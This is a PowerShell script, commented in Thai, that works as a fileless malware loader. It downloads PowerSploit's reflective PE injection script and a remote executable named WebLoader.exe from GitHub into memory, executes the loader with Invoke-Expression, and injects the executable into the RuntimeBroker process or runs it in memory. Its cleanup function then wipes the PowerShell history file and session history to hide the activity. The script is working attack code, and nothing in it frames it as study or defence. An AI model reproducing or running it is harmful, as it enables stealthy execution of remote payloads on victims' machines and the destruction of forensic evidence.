# --- 1. ตั้งค่าเป้าหมาย ---
$payloadUrl = "https://raw.githubusercontent.com/VortexStore/headhunter/refs/heads/main/WebLoader.exe"
$loaderUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"
$targetName = "RuntimeBroker"

# --- 2. ฟังก์ชันทำความสะอาด (Clean Up) ---
function Cleanup-Traces {
    Write-Host "[*] Cleaning up history and traces..." -ForegroundColor Magenta
    $historyPath = (Get-PSReadlineOption).HistorySavePath
    if (Test-Path $historyPath) { Clear-Content $historyPath }
    Clear-History
}

try {
    # --- 3. โหลดสคริปต์ Injection และ Payload เข้า RAM ---
    Write-Host "[*] Downloading components to memory..." -ForegroundColor Cyan
    $webClient = New-Object System.Net.WebClient
    $loaderScript = $webClient.DownloadString($loaderUrl)
    $exeBytes = $webClient.DownloadData($payloadUrl)
    
    # รันสคริปต์ Loader ใน Memory
    Invoke-Expression $loaderScript

    # --- 4. หา Process เป้าหมายและทำการ Inject ---
    $targetProc = Get-Process -Name $targetName -ErrorAction SilentlyContinue | Select-Object -First 1
    
    if ($null -ne $targetProc) {
        Write-Host "[*] Injecting into $($targetName) (PID: $($targetProc.Id))..." -ForegroundColor Green
        Invoke-ReflectivePEInjection -PEBytes $exeBytes -ProcId $targetProc.Id
    } else {
        Write-Host "[!] Target process not found. Running locally in memory..." -ForegroundColor Yellow
        Invoke-ReflectivePEInjection -PEBytes $exeBytes
    }
}
catch {
    Write-Host "[!] An error occurred: $_" -ForegroundColor Red
}
finally {
    # --- 5. ลบประวัติและปิดหน้าต่าง ---
    Cleanup-Traces
    Write-Host "[+] Task complete. Exiting..." -ForegroundColor Gray
    Start-Sleep -Seconds 2
    exit
}
